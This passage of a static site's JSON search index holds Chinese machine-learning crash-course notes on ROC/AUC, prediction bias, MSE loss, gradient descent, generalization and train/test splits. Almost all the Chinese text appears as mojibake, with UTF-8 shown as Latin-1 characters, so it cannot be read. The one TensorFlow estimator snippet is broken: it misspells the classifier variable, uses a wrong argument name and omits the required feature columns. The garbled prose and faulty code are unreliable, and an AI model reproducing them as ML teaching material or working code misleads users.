æ›²çº¿ï¼ˆæ¥æ”¶è€…æ“ä½œç‰¹å¾æ›²çº¿ï¼‰æ˜¯ä¸€ç§æ˜¾ç¤ºåˆ†ç±»æ¨¡å‹åœ¨æ‰€æœ‰åˆ†ç±»é˜ˆå€¼ä¸‹çš„æ•ˆæœçš„å›¾è¡¨ï¼Œç”¨äºç»˜åˆ¶é‡‡ç”¨ä¸åŒåˆ†ç±»é˜ˆå€¼æ—¶çš„ TPR ä¸ FPRã€‚\nè¯¥æ›²çº¿ç»˜åˆ¶äº†ä»¥ä¸‹ä¸¤ä¸ªå‚æ•°ï¼š\n çœŸæ­£ä¾‹ç‡ï¼Œå³å¬å›ç‡ï¼š$$\\displaystyle TPR = \\frac{TP} {TP + FN}$$ å‡æ­£ä¾‹ç‡ï¼š$$\\displaystyle FPR = \\frac{FP} {FP + TN}$$  ä¸‹å›¾æ˜¾ç¤ºäº†ä¸€ä¸ªå…¸å‹çš„ ROC æ›²çº¿ï¼š\næ›²çº¿ä¸‹é¢ç§¯çš„ä¸€ç§è§£è¯»æ–¹å¼æ˜¯çœ‹ä½œæ¨¡å‹å°†æŸä¸ªéšæœºæ­£ç±»åˆ«æ ·æœ¬æ’åˆ—åœ¨æŸä¸ªéšæœºè´Ÿç±»åˆ«æ ·æœ¬ä¹‹ä¸Šçš„æ¦‚ç‡ã€‚\nä»¥ä¸‹é¢çš„æ ·æœ¬ä¸ºä¾‹ï¼Œé€»è¾‘å›å½’é¢„æµ‹ä»å·¦åˆ°å³ä»¥å‡åºæ’åˆ—ï¼š\næ›²çº¿ä¸‹é¢ç§¯è¡¨ç¤ºéšæœºæ­£ç±»åˆ«ï¼ˆç»¿è‰²ï¼‰æ ·æœ¬ä½äºéšæœºè´Ÿç±»åˆ«ï¼ˆçº¢è‰²ï¼‰æ ·æœ¬å³ä¾§çš„æ¦‚ç‡ã€‚\næ›²çº¿ä¸‹é¢ç§¯å› ä»¥ä¸‹ä¸¤ä¸ªåŸå› è€Œæ¯”è¾ƒå®ç”¨ï¼š\n æ›²çº¿ä¸‹é¢ç§¯çš„å°ºåº¦ä¸å˜ã€‚å®ƒæµ‹é‡é¢„æµ‹çš„æ’åæƒ…å†µï¼Œè€Œä¸æ˜¯æµ‹é‡å…¶ç»å¯¹å€¼ã€‚ æ›²çº¿ä¸‹é¢ç§¯çš„åˆ†ç±»é˜ˆå€¼ä¸å˜ã€‚å®ƒæµ‹é‡æ¨¡å‹é¢„æµ‹çš„è´¨é‡ï¼Œè€Œä¸è€ƒè™‘æ‰€é€‰çš„åˆ†ç±»é˜ˆå€¼ã€‚  é¢„æµ‹åå·® #  é¢„æµ‹åå·®æŒ‡çš„æ˜¯ä¸¤ä¸ªå¹³å‡å€¼ä¹‹é—´çš„å·®å€¼ã€‚å³ï¼š\n$$é¢„æµ‹åå·® = é¢„æµ‹å¹³å‡å€¼ - æ•°æ®é›†ä¸­ç›¸åº”æ ‡ç­¾çš„å¹³å‡å€¼$$\nå¦‚æœå‡ºç°éå¸¸é«˜çš„éé›¶é¢„æµ‹åå·®ï¼Œåˆ™è¯´æ˜æ¨¡å‹æŸå¤„å­˜åœ¨é”™è¯¯ï¼Œå› ä¸ºè¿™è¡¨æ˜æ¨¡å‹å¯¹æ­£ç±»åˆ«æ ‡ç­¾çš„å‡ºç°é¢‘ç‡é¢„æµ‹æœ‰è¯¯ã€‚\næ‚¨å¯èƒ½ä¼šé€šè¿‡å¯¹å­¦ä¹ æ¨¡å‹è¿›è¡ŒåæœŸå¤„ç†æ¥çº æ­£é¢„æµ‹åå·®ï¼Œå³é€šè¿‡æ·»åŠ æ ¡å‡†å±‚æ¥è°ƒæ•´æ¨¡å‹çš„è¾“å‡ºï¼Œä»è€Œå‡å°é¢„æµ‹åå·®ã€‚\nåˆ†æ¡¶åå·®ã€‚\nå…³é”®å­—è¯ #  äºŒå…ƒåˆ†ç±»ã€åˆ†ç±»æ¨¡å‹ã€æ··æ·†çŸ©é˜µã€è´Ÿç±»åˆ«ã€æ­£ç±»åˆ«ã€å‡è´Ÿä¾‹ã€å‡æ­£ä¾‹ã€çœŸè´Ÿä¾‹ã€çœŸæ­£ä¾‹ã€æ›²çº¿ä¸‹é¢ç§¯ã€ROC æ›²çº¿\n"},{"id":323,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/2.descending/","title":"2. Descending","section":"æœºå™¨å­¦ä¹ å¿«é€Ÿå…¥é—¨æ•™ç¨‹","content":"æ·±å…¥äº†è§£æœºå™¨å­¦ä¹  #  çº¿æ€§å›å½’æ˜¯ä¸€ç§æ‰¾åˆ°æœ€é€‚åˆä¸€ç»„ç‚¹çš„ç›´çº¿æˆ–è¶…å¹³é¢çš„æ–¹æ³•ã€‚æœ¬æ¨¡å—ä¼šå…ˆç›´è§‚ä»‹ç»çº¿æ€§å›å½’ï¼Œä¸ºä»‹ç»çº¿æ€§å›å½’çš„æœºå™¨å­¦ä¹ æ–¹æ³•å¥ å®šåŸºç¡€ã€‚\nçº¿æ€§å›å½’ #  å…³é”®å­—è¯\nåå·®ã€ æ¨æ–­ã€çº¿æ€§å›å½’ã€æƒé‡\nè®­ç»ƒä¸æŸå¤± #  æ¦‚å¿µ #  è®­ç»ƒï¼š\n  è®­ç»ƒæ¨¡å‹è¡¨ç¤ºé€šè¿‡æœ‰æ ‡ç­¾æ ·æœ¬æ¥å­¦ä¹ ï¼ˆç¡®å®šï¼‰æ‰€æœ‰æƒé‡å’Œåå·®çš„ç†æƒ³å€¼ã€‚\n  åœ¨ç›‘ç£å¼å­¦ä¹ ä¸­ï¼Œæœºå™¨å­¦ä¹ ç®—æ³•é€šè¿‡ä»¥ä¸‹æ–¹å¼æ„å»ºæ¨¡å‹ï¼š\n æ£€æŸ¥å¤šä¸ªæ ·æœ¬å¹¶å°è¯•æ‰¾å‡ºå¯æœ€å¤§é™åº¦åœ°å‡å°‘æŸå¤±çš„æ¨¡å‹ï¼›è¿™ä¸€è¿‡ç¨‹ç§°ä¸ºç»éªŒé£é™©æœ€å°åŒ–ã€‚    æŸå¤±ï¼š\n æŸå¤±æ˜¯å¯¹ç³Ÿç³•é¢„æµ‹çš„æƒ©ç½šã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒæŸå¤±æ˜¯ä¸€ä¸ªæ•°å€¼ï¼Œè¡¨ç¤ºå¯¹äºå•ä¸ªæ ·æœ¬è€Œè¨€æ¨¡å‹é¢„æµ‹çš„å‡†ç¡®ç¨‹åº¦ã€‚ å¦‚æœæ¨¡å‹çš„é¢„æµ‹å®Œå…¨å‡†ç¡®ï¼Œåˆ™æŸå¤±ä¸ºé›¶ï¼Œå¦åˆ™æŸå¤±ä¼šè¾ƒå¤§ã€‚è®­ç»ƒæ¨¡å‹çš„ç›®æ ‡æ˜¯ä»æ‰€æœ‰æ ·æœ¬ä¸­æ‰¾åˆ°ä¸€ç»„å¹³å‡æŸå¤±â€œè¾ƒå°â€çš„æƒé‡å’Œåå·®ã€‚  æŸå¤±å‡½æ•° #  å¹³æ–¹æŸå¤±ï¼šæ˜¯ä¸€ç§å¸¸è§çš„æŸå¤±å‡½æ•°\næ¥ä¸‹æ¥æˆ‘ä»¬è¦çœ‹çš„çº¿æ€§å›å½’æ¨¡å‹ä½¿ç”¨çš„æ˜¯ä¸€ç§ç§°ä¸ºå¹³æ–¹æŸå¤±ï¼ˆåˆç§°ä¸º L2 æŸå¤±ï¼‰çš„æŸå¤±å‡½æ•°ã€‚å•ä¸ªæ ·æœ¬çš„å¹³æ–¹æŸå¤±å¦‚ä¸‹ï¼š\n = the square of the difference between the label and the prediction\r= (observation - prediction(x))2\r= (y - y\u0026#39;)2 å‡æ–¹è¯¯å·® (MSE) æŒ‡çš„æ˜¯æ¯ä¸ªæ ·æœ¬çš„å¹³å‡å¹³æ–¹æŸå¤±ã€‚è¦è®¡ç®— MSEï¼Œè¯·æ±‚å‡ºå„ä¸ªæ ·æœ¬çš„æ‰€æœ‰å¹³æ–¹æŸå¤±ä¹‹å’Œï¼Œç„¶åé™¤ä»¥æ ·æœ¬æ•°é‡ï¼š\n$$\\displaystyle MSE = \\frac{1}{N} \\sum_{(x,y) \\in D} (y - prediction(x))^2$$ï¼Œå…¶ä¸­ï¼š\n (x,y) æŒ‡çš„æ˜¯æ ·æœ¬ï¼Œå…¶ä¸­ï¼š  x æŒ‡çš„æ˜¯æ¨¡å‹è¿›è¡Œé¢„æµ‹æ—¶ä½¿ç”¨çš„ç‰¹å¾é›†ï¼ˆä¾‹å¦‚ï¼Œæ¸©åº¦ã€å¹´é¾„å’Œäº¤é…æˆåŠŸç‡ï¼‰ã€‚ y æŒ‡çš„æ˜¯æ ·æœ¬çš„æ ‡ç­¾ï¼ˆä¾‹å¦‚ï¼Œæ¯åˆ†é’Ÿçš„é¸£å«æ¬¡æ•°ï¼‰ã€‚   prediction(x) æŒ‡çš„æ˜¯æƒé‡å’Œåå·®ä¸ç‰¹å¾é›† x ç»“åˆçš„å‡½æ•°ã€‚ D æŒ‡çš„æ˜¯åŒ…å«å¤šä¸ªæœ‰æ ‡ç­¾æ ·æœ¬ï¼ˆå³ (x,y)ï¼‰çš„æ•°æ®é›†ã€‚ N æŒ‡çš„æ˜¯ D ä¸­çš„æ ·æœ¬æ•°é‡ã€‚  è™½ç„¶ MSE å¸¸ç”¨äºæœºå™¨å­¦ä¹ ï¼Œä½†å®ƒæ—¢ä¸æ˜¯å”¯ä¸€å®ç”¨çš„æŸå¤±å‡½æ•°ï¼Œä¹Ÿä¸æ˜¯é€‚ç”¨äºæ‰€æœ‰æƒ…å½¢çš„æœ€ä½³æŸå¤±å‡½æ•°ã€‚\nå…³é”®å­—è¯ #  ç»éªŒé£é™©æœ€å°åŒ–ã€æŸå¤±ã€å‡æ–¹è¯¯å·®ã€å¹³æ–¹æŸå¤±ã€è®­ç»ƒ\n"},{"id":324,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/3.reduceloss/","title":"3. Reduce Loss","section":"æœºå™¨å­¦ä¹ å¿«é€Ÿå…¥é—¨æ•™ç¨‹","content":"é™ä½æŸå¤± #  è¿­ä»£æ–¹æ³• #  ä¸‹å›¾æ˜¾ç¤ºäº†æœºå™¨å­¦ä¹ ç®—æ³•ç”¨äºè®­ç»ƒæ¨¡å‹çš„è¿­ä»£è¯•é”™è¿‡ç¨‹ï¼š\n  æ¨¡å‹éƒ¨åˆ†å°†ä¸€ä¸ªæˆ–å¤šä¸ªç‰¹å¾ä½œä¸ºè¾“å…¥ï¼Œç„¶åè¿”å›ä¸€ä¸ªé¢„æµ‹ (y\u0026rsquo;) ä½œä¸ºè¾“å‡ºã€‚\n  è®¡ç®—æŸå¤±éƒ¨åˆ†æ˜¯æ¨¡å‹å°†è¦ä½¿ç”¨çš„æŸå¤±å‡½æ•°ã€‚\n  è®¡ç®—å‚æ•°æ›´æ–°éƒ¨åˆ†ï¼šæœºå™¨å­¦ä¹ ç³»ç»Ÿå°±æ˜¯åœ¨æ­¤éƒ¨åˆ†æ£€æŸ¥æŸå¤±å‡½æ•°çš„å€¼ï¼Œå¹¶ç”Ÿæˆæ–°å‚æ•°å€¼ã€‚æœºå™¨å­¦ä¹ ç³»ç»Ÿå°†æ ¹æ®æ‰€æœ‰æ ‡ç­¾é‡æ–°è¯„ä¼°æ‰€æœ‰ç‰¹å¾ï¼Œä¸ºæŸå¤±å‡½æ•°ç”Ÿæˆä¸€ä¸ªæ–°å€¼ï¼Œè€Œè¯¥å€¼åˆäº§ç”Ÿæ–°çš„å‚æ•°å€¼ã€‚\né€šå¸¸ï¼Œå¯ä»¥ä¸æ–­è¿­ä»£ï¼Œç›´åˆ°æ€»ä½“æŸå¤±ä¸å†å˜åŒ–æˆ–è‡³å°‘å˜åŒ–æå…¶ç¼“æ…¢ä¸ºæ­¢ã€‚è¿™æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥è¯´è¯¥æ¨¡å‹å·²æ”¶æ•›ã€‚\n  å…³é”®å­—è¯ï¼š\næ”¶æ•›ã€æŸå¤±ã€è®­ç»ƒ\næ¢¯åº¦ä¸‹é™æ³• #  å­¦ä¹ é€Ÿç‡ #  æ¢¯åº¦ä¸‹é™æ³•ç®—æ³•ç”¨æ¢¯åº¦ä¹˜ä»¥ä¸€ä¸ªç§°ä¸ºå­¦ä¹ é€Ÿç‡ï¼ˆæœ‰æ—¶ä¹Ÿç§°ä¸ºæ­¥é•¿ï¼‰çš„æ ‡é‡ï¼Œä»¥ç¡®å®šä¸‹ä¸€ä¸ªç‚¹çš„ä½ç½®ã€‚\n å¦‚æœæ‚¨é€‰æ‹©çš„å­¦ä¹ é€Ÿç‡è¿‡å°ï¼Œå°±ä¼šèŠ±è´¹å¤ªé•¿çš„å­¦ä¹ æ—¶é—´ï¼› ç›¸åï¼Œå¦‚æœæ‚¨æŒ‡å®šçš„å­¦ä¹ é€Ÿç‡è¿‡å¤§ï¼Œä¸‹ä¸€ä¸ªç‚¹å°†æ°¸è¿œåœ¨ U å½¢æ›²çº¿çš„åº•éƒ¨éšæ„å¼¹è·³ï¼› æ¯ä¸ªå›å½’é—®é¢˜éƒ½å­˜åœ¨ä¸€ä¸ªé‡‘å‘å§‘å¨˜å­¦ä¹ é€Ÿç‡ã€‚â€œé‡‘å‘å§‘å¨˜â€å€¼ä¸æŸå¤±å‡½æ•°çš„å¹³å¦ç¨‹åº¦ç›¸å…³ã€‚å¦‚æœæ‚¨çŸ¥é“æŸå¤±å‡½æ•°çš„æ¢¯åº¦è¾ƒå°ï¼Œåˆ™å¯ä»¥æ”¾å¿ƒåœ°è¯•ç€é‡‡ç”¨æ›´å¤§çš„å­¦ä¹ é€Ÿç‡ï¼Œä»¥è¡¥å¿è¾ƒå°çš„æ¢¯åº¦å¹¶è·å¾—æ›´å¤§çš„æ­¥é•¿ã€‚  å…³é”®å­—è¯ï¼š\nè¶…å‚æ•°ã€å­¦ä¹ é€Ÿç‡ã€æ­¥é•¿\néšæœºæ¢¯åº¦ä¸‹é™ #  åœ¨æ¢¯åº¦ä¸‹é™æ³•ä¸­ï¼Œæ‰¹é‡æŒ‡çš„æ˜¯ç”¨äºåœ¨å•æ¬¡è¿­ä»£ä¸­è®¡ç®—æ¢¯åº¦çš„æ ·æœ¬æ€»æ•°ã€‚åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬ä¸€ç›´å‡å®šæ‰¹é‡æ˜¯æŒ‡æ•´ä¸ªæ•°æ®é›†ã€‚å°± Google çš„è§„æ¨¡è€Œè¨€ï¼Œæ•°æ®é›†é€šå¸¸åŒ…å«æ•°åäº¿ç”šè‡³æ•°åƒäº¿ä¸ªæ ·æœ¬ã€‚æ­¤å¤–ï¼ŒGoogle æ•°æ®é›†é€šå¸¸åŒ…å«æµ·é‡ç‰¹å¾ã€‚å› æ­¤ï¼Œä¸€ä¸ªæ‰¹é‡å¯èƒ½ç›¸å½“å·¨å¤§ã€‚å¦‚æœæ˜¯è¶…å¤§æ‰¹é‡ï¼Œåˆ™å•æ¬¡è¿­ä»£å°±å¯èƒ½è¦èŠ±è´¹å¾ˆé•¿æ—¶é—´è¿›è¡Œè®¡ç®—ã€‚\nåŒ…å«éšæœºæŠ½æ ·æ ·æœ¬çš„å¤§å‹æ•°æ®é›†å¯èƒ½åŒ…å«å†—ä½™æ•°æ®ã€‚å®é™…ä¸Šï¼Œæ‰¹é‡å¤§å°è¶Šå¤§ï¼Œå‡ºç°å†—ä½™çš„å¯èƒ½æ€§å°±è¶Šé«˜ã€‚ä¸€äº›å†—ä½™å¯èƒ½æœ‰åŠ©äºæ¶ˆé™¤æ‚ä¹±çš„æ¢¯åº¦ï¼Œä½†è¶…å¤§æ‰¹é‡æ‰€å…·å¤‡çš„é¢„æµ‹ä»·å€¼å¾€å¾€å¹¶ä¸æ¯”å¤§å‹æ‰¹é‡é«˜ã€‚\nå¦‚æœæˆ‘ä»¬å¯ä»¥é€šè¿‡æ›´å°‘çš„è®¡ç®—é‡å¾—å‡ºæ­£ç¡®çš„å¹³å‡æ¢¯åº¦ï¼Œä¼šæ€ä¹ˆæ ·ï¼Ÿé€šè¿‡ä»æˆ‘ä»¬çš„æ•°æ®é›†ä¸­éšæœºé€‰æ‹©æ ·æœ¬ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å°å¾—å¤šçš„æ•°æ®é›†ä¼°ç®—ï¼ˆå°½ç®¡è¿‡ç¨‹éå¸¸æ‚ä¹±ï¼‰å‡ºè¾ƒå¤§çš„å¹³å‡å€¼ã€‚ éšæœºæ¢¯åº¦ä¸‹é™æ³•(SGD) å°†è¿™ç§æƒ³æ³•è¿ç”¨åˆ°æè‡´ï¼Œå®ƒæ¯æ¬¡è¿­ä»£åªä½¿ç”¨ä¸€ä¸ªæ ·æœ¬ï¼ˆæ‰¹é‡å¤§å°ä¸º 1ï¼‰ã€‚å¦‚æœè¿›è¡Œè¶³å¤Ÿçš„è¿­ä»£ï¼ŒSGD ä¹Ÿå¯ä»¥å‘æŒ¥ä½œç”¨ï¼Œä½†è¿‡ç¨‹ä¼šéå¸¸æ‚ä¹±ã€‚â€œéšæœºâ€è¿™ä¸€æœ¯è¯­è¡¨ç¤ºæ„æˆå„ä¸ªæ‰¹é‡çš„ä¸€ä¸ªæ ·æœ¬éƒ½æ˜¯éšæœºé€‰æ‹©çš„ã€‚\nå°æ‰¹é‡éšæœºæ¢¯åº¦ä¸‹é™æ³•ï¼ˆå°æ‰¹é‡ SGDï¼‰æ˜¯ä»‹äºå…¨æ‰¹é‡è¿­ä»£ä¸ SGD ä¹‹é—´çš„æŠ˜è¡·æ–¹æ¡ˆã€‚å°æ‰¹é‡é€šå¸¸åŒ…å« 10-1000 ä¸ªéšæœºé€‰æ‹©çš„æ ·æœ¬ã€‚å°æ‰¹é‡ SGD å¯ä»¥å‡å°‘ SGD ä¸­çš„æ‚ä¹±æ ·æœ¬æ•°é‡ï¼Œä½†ä»ç„¶æ¯”å…¨æ‰¹é‡æ›´é«˜æ•ˆã€‚\nä¸ºäº†ç®€åŒ–è¯´æ˜ï¼Œæˆ‘ä»¬åªé’ˆå¯¹å•ä¸ªç‰¹å¾é‡ç‚¹ä»‹ç»äº†æ¢¯åº¦ä¸‹é™æ³•ã€‚è¯·æ”¾å¿ƒï¼Œæ¢¯åº¦ä¸‹é™æ³•ä¹Ÿé€‚ç”¨äºåŒ…å«å¤šä¸ªç‰¹å¾çš„ç‰¹å¾é›†ã€‚\n"},{"id":325,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/4.tensorflowapi/","title":"4. Tensor Flow API","section":"æœºå™¨å­¦ä¹ å¿«é€Ÿå…¥é—¨æ•™ç¨‹","content":"TensoFlow API #  tf.estimator API #  import tensorflow as tf  # set up a linear classifier classifier = tf.estimator.LinearClassifier()  # train the model on some example data classfier.train(input=train_input_fn, steps=2000)  # use it to predict predictions = classifier.predict(input_fn = predict_input_fn) "},{"id":326,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/5.generalization/","title":"5. Generalization","section":"æœºå™¨å­¦ä¹ å¿«é€Ÿå…¥é—¨æ•™ç¨‹","content":"æ³›åŒ– #  è¿‡æ‹Ÿåˆ #  ä¸‹å›¾æ‰€ç¤ºçš„æ¨¡å‹è¿‡æ‹Ÿåˆäº†è®­ç»ƒæ•°æ®çš„ç‰¹æ€§ã€‚è¿‡æ‹Ÿåˆæ¨¡å‹åœ¨è®­ç»ƒè¿‡ç¨‹ä¸­äº§ç”Ÿçš„æŸå¤±å¾ˆä½ï¼Œä½†åœ¨é¢„æµ‹æ–°æ•°æ®æ–¹é¢çš„è¡¨ç°å´éå¸¸ç³Ÿç³•ã€‚å¦‚æœæŸä¸ªæ¨¡å‹åœ¨æ‹Ÿåˆå½“å‰æ ·æœ¬æ–¹é¢è¡¨ç°è‰¯å¥½ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•ç›¸ä¿¡è¯¥æ¨¡å‹ä¼šå¯¹æ–°æ•°æ®åšå‡ºè‰¯å¥½çš„é¢„æµ‹å‘¢ï¼Ÿæ­£å¦‚æ‚¨ç¨åå°†çœ‹åˆ°çš„ï¼Œè¿‡æ‹Ÿåˆæ˜¯ç”±äºæ¨¡å‹çš„å¤æ‚ç¨‹åº¦è¶…å‡ºæ‰€éœ€ç¨‹åº¦è€Œé€ æˆçš„ã€‚æœºå™¨å­¦ä¹ çš„åŸºæœ¬å†²çªæ˜¯é€‚å½“æ‹Ÿåˆæˆ‘ä»¬çš„æ•°æ®ï¼Œä½†ä¹Ÿè¦å°½å¯èƒ½ç®€å•åœ°æ‹Ÿåˆæ•°æ®ã€‚\næœºå™¨å­¦ä¹ çš„ç›®æ ‡æ˜¯å¯¹ä»çœŸå®æ¦‚ç‡åˆ†å¸ƒï¼ˆå·²éšè—ï¼‰ä¸­æŠ½å–çš„æ–°æ•°æ®åšå‡ºè‰¯å¥½é¢„æµ‹ã€‚é—æ†¾çš„æ˜¯ï¼Œæ¨¡å‹æ— æ³•æŸ¥çœ‹æ•´ä½“æƒ…å†µï¼›æ¨¡å‹åªèƒ½ä»è®­ç»ƒæ•°æ®é›†ä¸­å–æ ·ã€‚å¦‚æœæŸä¸ªæ¨¡å‹åœ¨æ‹Ÿåˆå½“å‰æ ·æœ¬æ–¹é¢è¡¨ç°è‰¯å¥½ï¼Œé‚£ä¹ˆæ‚¨å¦‚ä½•ç›¸ä¿¡è¯¥æ¨¡å‹ä¹Ÿä¼šå¯¹ä»æœªè§è¿‡çš„æ ·æœ¬åšå‡ºè‰¯å¥½é¢„æµ‹å‘¢ï¼Ÿ\nå¥¥å¡å§†çš„å¨å»‰æ˜¯ 14 ä¸–çºªä¸€ä½å´‡å°šç®€å•çš„ä¿®å£«å’Œå“²å­¦å®¶ã€‚ä»–è®¤ä¸ºç§‘å­¦å®¶åº”è¯¥ä¼˜å…ˆé‡‡ç”¨æ›´ç®€å•ï¼ˆè€Œéæ›´å¤æ‚ï¼‰çš„å…¬å¼æˆ–ç†è®ºã€‚å¥¥å¡å§†å‰ƒåˆ€å®šå¾‹åœ¨æœºå™¨å­¦ä¹ æ–¹é¢çš„è¿ç”¨å¦‚ä¸‹ï¼š\n æœºå™¨å­¦ä¹ æ¨¡å‹è¶Šç®€å•ï¼Œè‰¯å¥½çš„å®è¯ç»“æœå°±è¶Šæœ‰å¯èƒ½ä¸ä»…ä»…åŸºäºæ ·æœ¬çš„ç‰¹æ€§ã€‚\n ç°ä»Šï¼Œæˆ‘ä»¬å·²å°†å¥¥å¡å§†å‰ƒåˆ€å®šå¾‹æ­£å¼åº”ç”¨äºç»Ÿè®¡å­¦ä¹ ç†è®ºå’Œè®¡ç®—å­¦ä¹ ç†è®ºé¢†åŸŸã€‚è¿™äº›é¢†åŸŸå·²ç»å½¢æˆäº†æ³›åŒ–è¾¹ç•Œï¼Œå³ç»Ÿè®¡åŒ–æè¿°æ¨¡å‹æ ¹æ®ä»¥ä¸‹å› ç´ æ³›åŒ–åˆ°æ–°æ•°æ®çš„èƒ½åŠ›ï¼š\n æ¨¡å‹çš„å¤æ‚ç¨‹åº¦ æ¨¡å‹åœ¨å¤„ç†è®­ç»ƒæ•°æ®æ–¹é¢çš„è¡¨ç°  è™½ç„¶ç†è®ºåˆ†æåœ¨ç†æƒ³åŒ–å‡è®¾ä¸‹å¯æä¾›æ­£å¼ä¿è¯ï¼Œä½†åœ¨å®è·µä¸­å´å¾ˆéš¾åº”ç”¨ã€‚æœºå™¨å­¦ä¹ é€Ÿæˆè¯¾ç¨‹åˆ™ä¾§é‡äºå®è¯è¯„ä¼°ï¼Œä»¥è¯„åˆ¤æ¨¡å‹æ³›åŒ–åˆ°æ–°æ•°æ®çš„èƒ½åŠ›ã€‚\næœºå™¨å­¦ä¹ æ¨¡å‹æ—¨åœ¨æ ¹æ®ä»¥å‰æœªè§è¿‡çš„æ–°æ•°æ®åšå‡ºè‰¯å¥½é¢„æµ‹ã€‚ä½†æ˜¯ï¼Œå¦‚æœæ‚¨è¦æ ¹æ®æ•°æ®é›†æ„å»ºæ¨¡å‹ï¼Œå¦‚ä½•è·å¾—ä»¥å‰æœªè§è¿‡çš„æ•°æ®å‘¢ï¼Ÿä¸€ç§æ–¹æ³•æ˜¯å°†æ‚¨çš„æ•°æ®é›†åˆ†æˆä¸¤ä¸ªå­é›†ï¼š\n è®­ç»ƒé›† - ç”¨äºè®­ç»ƒæ¨¡å‹çš„å­é›†ã€‚ æµ‹è¯•é›† - ç”¨äºæµ‹è¯•æ¨¡å‹çš„å­é›†ã€‚  ä¸€èˆ¬æ¥è¯´ï¼Œåœ¨æµ‹è¯•é›†ä¸Šè¡¨ç°æ˜¯å¦è‰¯å¥½æ˜¯è¡¡é‡èƒ½å¦åœ¨æ–°æ•°æ®ä¸Šè¡¨ç°è‰¯å¥½çš„æœ‰ç”¨æŒ‡æ ‡ï¼Œå‰ææ˜¯ï¼š\n æµ‹è¯•é›†è¶³å¤Ÿå¤§ã€‚ æ‚¨ä¸ä¼šåå¤ä½¿ç”¨ç›¸åŒçš„æµ‹è¯•é›†æ¥ä½œå‡ã€‚  æœºå™¨å­¦ä¹ ç»†åˆ™ #  ä»¥ä¸‹ä¸‰é¡¹åŸºæœ¬å‡è®¾é˜æ˜äº†æ³›åŒ–ï¼š\n æˆ‘ä»¬ä»åˆ†å¸ƒä¸­éšæœºæŠ½å–ç‹¬ç«‹åŒåˆ†å¸ƒ (i.i.d) çš„æ ·æœ¬ã€‚æ¢è¨€ä¹‹ï¼Œæ ·æœ¬ä¹‹é—´ä¸ä¼šäº’ç›¸å½±å“ã€‚ï¼ˆå¦ä¸€ç§è§£é‡Šï¼ši.i.d. æ˜¯è¡¨ç¤ºå˜é‡éšæœºæ€§çš„ä¸€ç§æ–¹å¼ï¼‰ã€‚ åˆ†å¸ƒæ˜¯å¹³ç¨³çš„ï¼›å³åˆ†å¸ƒåœ¨æ•°æ®é›†å†…ä¸ä¼šå‘ç”Ÿå˜åŒ–ã€‚ æˆ‘ä»¬ä»åŒä¸€åˆ†å¸ƒçš„æ•°æ®åˆ’åˆ†ä¸­æŠ½å–æ ·æœ¬ã€‚  åœ¨å®è·µä¸­ï¼Œæˆ‘ä»¬æœ‰æ—¶ä¼šè¿èƒŒè¿™äº›å‡è®¾ã€‚ä¾‹å¦‚ï¼š\n æƒ³è±¡æœ‰ä¸€ä¸ªé€‰æ‹©è¦å±•ç¤ºçš„å¹¿å‘Šçš„æ¨¡å‹ã€‚å¦‚æœè¯¥æ¨¡å‹åœ¨æŸç§ç¨‹åº¦ä¸Šæ ¹æ®ç”¨æˆ·ä»¥å‰çœ‹è¿‡çš„å¹¿å‘Šé€‰æ‹©å¹¿å‘Šï¼Œåˆ™ä¼šè¿èƒŒ i.i.d. å‡è®¾ã€‚ æƒ³è±¡æœ‰ä¸€ä¸ªåŒ…å«ä¸€å¹´é›¶å”®ä¿¡æ¯çš„æ•°æ®é›†ã€‚ç”¨æˆ·çš„è´­ä¹°è¡Œä¸ºä¼šå‡ºç°å­£èŠ‚æ€§å˜åŒ–ï¼Œè¿™ä¼šè¿åå¹³ç¨³æ€§ã€‚  å¦‚æœè¿èƒŒäº†ä¸Šè¿°ä¸‰é¡¹åŸºæœ¬å‡è®¾ä¸­çš„ä»»ä½•ä¸€é¡¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¿…é¡»å¯†åˆ‡æ³¨æ„æŒ‡æ ‡ã€‚\nå…³é”®å­—è¯ #  æ³›åŒ–ã€è¿‡æ‹Ÿåˆã€é¢„æµ‹ã€ å¹³ç¨³æ€§ã€æµ‹è¯•é›†ã€è®­ç»ƒé›†\n"},{"id":327,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/6.trainingandtest/","title":"6. Training and Test","section":"æœºå™¨å­¦ä¹ å¿«é€Ÿå…¥é—¨æ•™ç¨‹","content":"æµ‹è¯•é›†å’Œæ•°æ®é›† #  ä¸Šä¸€å•å…ƒä»‹ç»äº†å°†æ•°æ®é›†åˆ†ä¸ºä¸¤ä¸ªå­é›†çš„æ¦‚å¿µï¼š\n è®­ç»ƒé›† - ç”¨äºè®­ç»ƒæ¨¡å‹çš„å­é›†ã€‚ æµ‹è¯•é›† - ç”¨äºæµ‹è¯•è®­ç»ƒåæ¨¡å‹çš„å­é›†ã€‚  